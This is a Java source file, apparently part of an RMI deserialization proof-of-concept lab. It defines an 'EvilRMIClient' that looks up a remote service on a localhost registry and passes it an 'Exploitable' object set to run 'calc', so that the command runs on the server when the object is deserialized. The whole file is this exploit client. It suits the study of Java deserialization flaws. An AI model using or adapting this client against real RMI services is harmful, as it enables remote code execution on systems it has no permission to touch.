package org.trganda.client;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import org.trganda.remote.RemoteService;
import org.trganda.util.Exploitable;

public class EvilRMIClient {
    public void callRemote(String name) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        RemoteService rs = (RemoteService) registry.lookup(name);

        Exploitable poc = new Exploitable();
        poc.setParam("calc");
        
        rs.doSome(poc);
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient rc = new EvilRMIClient();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
